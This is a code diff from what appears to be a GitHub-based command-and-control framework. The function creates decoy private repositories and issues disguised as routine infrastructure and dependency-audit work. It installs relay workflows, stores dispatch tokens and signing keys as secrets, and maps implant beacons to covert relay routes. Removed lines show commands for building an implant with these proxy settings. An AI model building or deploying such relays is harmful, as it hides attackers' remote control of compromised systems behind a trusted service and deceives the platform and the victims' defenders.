+    const stored = parseControlCredentialFingerprints(
+      storedFingerprintRaw,
+      control,
+    );
+    if (
+      stored.relaySigningKeySha256 !==
+        expectedFingerprints.relaySigningKeySha256 ||
+      stored.targetDispatchTokenSha256 !==
+        expectedFingerprints.targetDispatchTokenSha256
+    ) {
+      throw new Error(
+        `${control.owner}/${control.repo} proxy control credentials differ ` +
+          "from the stable credentials used by existing routes",
+      );
+    }
+  }
+  const monitoringPublicKey = await readRequiredMonitoringKey(
+    octokit,
+    control,
+  );
+  let monitoringKeyBytes: Uint8Array;
+  try {
+    monitoringKeyBytes = await decodeBase64Url(monitoringPublicKey);
+  } catch {
+    throw new Error("MONITORING_PUBKEY must be valid base64url");
+  }
+  if (monitoringKeyBytes.length !== 32) {
+    throw new Error("MONITORING_PUBKEY must decode to 32 bytes");
+  }
+
   if (opts.createRepo) {
     await octokit.rest.repos.createForAuthenticatedUser({
-      name: repo,
+      name: decoy.repo,
       private: true,
       description: "Infrastructure utilities and helper scripts",
       auto_init: false,
     });
   }
 
-  // 4. Optionally scaffold the repo
   if (opts.scaffold) {
-    const readmeContent = `# ${repo}\n\nInternal infrastructure tooling.\n`;
-    const gitignoreContent = `node_modules/\n.env\n*.log\ndist/\n`;
-
     await octokit.rest.repos.createOrUpdateFileContents({
-      owner, repo,
+      ...decoy,
       path: "README.md",
       message: "Initial scaffold",
-      content: Buffer.from(readmeContent).toString("base64"),
+      content: Buffer.from(
+        `# ${decoy.repo}\n\nInternal infrastructure tooling.\n`,
+      ).toString("base64"),
     });
-
     await octokit.rest.repos.createOrUpdateFileContents({
-      owner, repo,
+      ...decoy,
       path: ".gitignore",
       message: "Add .gitignore",
-      content: Buffer.from(gitignoreContent).toString("base64"),
+      content: Buffer.from("node_modules/\n.env\n*.log\ndist/\n").toString(
+        "base64",
+      ),
     });
   }
 
-  // 5. Create issue
-  const issueResp = await octokit.rest.issues.create({
-    owner, repo,
-    title: issueTitle,
+  const issue = await octokit.rest.issues.create({
+    ...decoy,
+    title:
+      opts.issueTitle ?? "Dependency audit: review pinned versions",
     body: "Track progress on quarterly dependency review.",
   });
-  const proxyIssueNumber = issueResp.data.number;
+  const decoyIssue = issue.data.number;
 
-  // 6. Push workflow files
-  await octokit.rest.repos.createOrUpdateFileContents({
-    owner, repo,
-    path: ".github/workflows/helper.yml",
-    message: "Add helper workflow",
-    content: Buffer.from(TEMPLATE_HELPER).toString("base64"),
-  });
-
-  await octokit.rest.repos.createOrUpdateFileContents({
-    owner, repo,
-    path: ".github/workflows/sync-helper.yml",
-    message: "Add sync-helper workflow",
-    content: Buffer.from(TEMPLATE_SYNC_HELPER).toString("base64"),
-  });
-
-  // 7. Get repo public key for secret encryption
-  const pkResp = await octokit.rest.actions.getRepoPublicKey({ owner, repo });
-  const { key_id, key: repoPublicKey } = pkResp.data;
-
-  // 8. Set 4 secrets
-  const secretsToSet: Array<{ name: string; value: string }> = [
-    { name: "SYNC_TOKEN",      value: opts.ctrlToken },
-    { name: "SYNC_REPO_OWNER", value: opts.ctrlOwner },
-    { name: "SYNC_REPO_NAME",  value: opts.ctrlRepo },
-    { name: "NODE_ID",         value: beacon.beaconId },
-  ];
-
-  for (const { name, value } of secretsToSet) {
-    const encryptedValue = await encryptGitHubSecret(value, repoPublicKey);
-    await octokit.rest.actions.createOrUpdateRepoSecret({
-      owner, repo,
-      secret_name: name,
-      encrypted_value: encryptedValue,
-      key_id,
+  for (const template of [
+    {
+      repository: decoy,
+      filename: "helper.yml",
+      content: TEMPLATE_HELPER,
+    },
+    {
+      repository: decoy,
+      filename: "sync-helper.yml",
+      content: TEMPLATE_SYNC_HELPER,
+    },
+    {
+      repository: control,
+      filename: "process-checkin.yml",
+      content: TEMPLATE_PROCESS_CHECKIN,
+    },
+    {
+      repository: control,
+      filename: "forward-replies.yml",
+      content: TEMPLATE_FORWARD_REPLIES,
+    },
+  ] as const) {
+    await octokit.rest.repos.createOrUpdateFileContents({
+      ...template.repository,
+      path: `.github/workflows/${template.filename}`,
+      message: `Install OctoProxy ${template.filename}`,
+      content: Buffer.from(template.content).toString("base64"),
     });
   }
 
-  // 9. Set 2 variables
-  const variablesToSet: Array<{ name: string; value: string }> = [
-    { name: "FORWARD_ISSUE",   value: String(proxyIssueNumber) },
-    { name: "LAST_UPDATE_TS",  value: "1970-01-01T00:00:00Z" },
-  ];
+  await setSecrets(octokit, decoy, {
+    CONTROL_TOKEN: opts.controlDispatchToken,
+    CONTROL_OWNER: control.owner,
+    CONTROL_REPO: control.repo,
+    NODE_ID: beacon.beaconId,
+    RELAY_SIGNING_KEY: opts.relaySigningKey,
+  });
+  await setSecrets(octokit, control, {
+    TARGET_TOKEN: opts.targetDispatchToken,
+    RELAY_SIGNING_KEY: opts.relaySigningKey,
+  });
 
-  for (const { name, value } of variablesToSet) {
-    try {
-      await octokit.rest.actions.createRepoVariable({ owner, repo, name, value });
-    } catch (err: unknown) {
-      const status = (err as { status?: number }).status;
-      if (status === 422) {
-        await octokit.rest.actions.updateRepoVariable({ owner, repo, name, value });
-      } else {
-        throw err;
-      }
-    }
-  }
+  await upsertVariable(octokit, decoy, "FORWARD_ISSUE", String(decoyIssue));
+  await upsertVariable(
+    octokit,
+    decoy,
+    "MONITORING_PUBKEY",
+    monitoringPublicKey,
+  );
+  routeMap[beacon.beaconId] = {
+    controlIssue: beacon.issueNumber,
+    decoyRepository: `${decoy.owner}/${decoy.repo}`,
+    decoyIssue,
+  };
+  await upsertVariable(
+    octokit,
+    control,
+    "NODE_ROUTE_MAP",
+    JSON.stringify(routeMap),
+  );
+  await upsertVariable(
+    octokit,
+    control,
+    CONTROL_CREDENTIAL_FINGERPRINTS,
+    JSON.stringify(expectedFingerprints),
+  );
 
-  // 10. Write proxy record
   const recordDir = join(dataDir, "proxies", beacon.beaconId);
   await mkdir(recordDir, { recursive: true });
-  const recordPath = join(recordDir, `${owner}--${repo}.json`);
-  const recordData: Record<string, unknown> = {
-    decoyOwner: owner,
-    decoyRepo: repo,
-    innerKind,
-    proxyIssueNumber,
-    beaconId: beacon.beaconId,
-    createdAt: new Date().toISOString(),
+  const recordPath = join(
+    recordDir,
+    `${decoy.owner}--${decoy.repo}.json`,
+  );
+  await writeFile(
+    recordPath,
+    JSON.stringify(
+      {
+        beaconId: beacon.beaconId,
+        controlRepository: `${control.owner}/${control.repo}`,
+        controlIssue: beacon.issueNumber,
+        decoyOwner: decoy.owner,
+        decoyRepo: decoy.repo,
+        decoyIssue,
+        innerKind,
+        proxyInstallationId: opts.proxyInstallationId,
+        createdAt: new Date().toISOString(),
+      },
+      null,
+      2,
+    ),
+  );
+
+  const requiredPermission = {
+    metadata: "read",
+    issues: "write",
+    variables: "read",
   };
-  if (opts.appId && opts.installationId && opts.appPrivateKey) {
-    recordData.appConfig = {
-      appId:          opts.appId,
-      installationId: opts.installationId,
-      privateKey:     opts.appPrivateKey,
-    };
-  }
-  await writeFile(recordPath, JSON.stringify(recordData, null, 2));
-
-  // 11. Print sync repo instructions
-  print(`Sync repo next steps:`);
-  print(`  1. Commit process-checkin.yml to ${opts.ctrlOwner}/${opts.ctrlRepo}/.github/workflows/`);
-  print(`     (run: octoctl proxy templates --inner-kind issues to get the file)`);
-  print(`  2. Set these secrets on ${opts.ctrlOwner}/${opts.ctrlRepo}:`);
-  print(`       MAIN_TOKEN       — PAT with issues:write on main repo`);
-  print(`       MAIN_REPO_OWNER  — main repo owner`);
-  print(`       MAIN_REPO_NAME   — main repo name`);
-  print(`       TARGET_TOKEN     — PAT with actions:write on ${owner}/${repo}`);
-  print(`  3. Update NODE_ISSUE_MAP secret on ${opts.ctrlOwner}/${opts.ctrlRepo}:`);
-  print(`       Current value (add this entry): {"${beacon.beaconId}": ${beacon.issueNumber}}`);
+  print(
+    `Proxy relay configured: ${decoy.owner}/${decoy.repo} <-> ` +
+      `${control.owner}/${control.repo}`,
+  );
   print("");
-
-  // 12. Build SVC_PROXY_REPOS value
-  const proxyRepoEntry: Record<string, unknown> = {
-    owner,
-    repo,
-    innerKind,
-  };
-  if (opts.proxyToken) {
-    proxyRepoEntry.token = opts.proxyToken;
-  }
-  if (opts.appId && opts.installationId && opts.appPrivateKey) {
-    proxyRepoEntry.appConfig = {
-      appId:          opts.appId,
-      installationId: opts.installationId,
-      privateKey:     opts.appPrivateKey,
-    };
-  }
-  const proxyReposValue = JSON.stringify([proxyRepoEntry]);
-
-  // 13. Print final output
-  print(`✓ Proxy configured: ${owner}/${repo} (issue #${proxyIssueNumber})`);
+  print("Merge into OCTOC2_RECOVERY_POLICIES:");
+  print(
+    JSON.stringify(
+      {
+        [beacon.beaconId]: {
+          proxyRepos: [
+            {
+              owner: decoy.owner,
+              repo: decoy.repo,
+              innerKind,
+              decoyIssue,
+            },
+          ],
+        },
+      },
+      null,
+      2,
+    ),
+  );
   print("");
-  print(`Add to your next beacon build:`);
+  print("Merge into OCTOC2_GITHUB_APP_POLICIES:");
+  print(
+    JSON.stringify(
+      {
+        [beacon.beaconId]: {
+          proxyRepositories: [
+            {
+              installationId: opts.proxyInstallationId,
+              repository: decoy,
+              permissions: requiredPermission,
+            },
+          ],
+        },
+      },
+      null,
+      2,
+    ),
+  );
   print("");
-  print(`SVC_PROXY_REPOS='${proxyReposValue}'`);
-  print("");
-  print(`octoctl build-beacon --outfile ./implant \\`);
-  print(`  --env "SVC_PROXY_REPOS=<value above>" \\`);
-  print(`  --env "SVC_TENTACLE_PRIORITY=proxy,issues"`);
+  print(
+    "No static proxy token or GitHub App private key was written to beacon configuration.",
+  );
 }
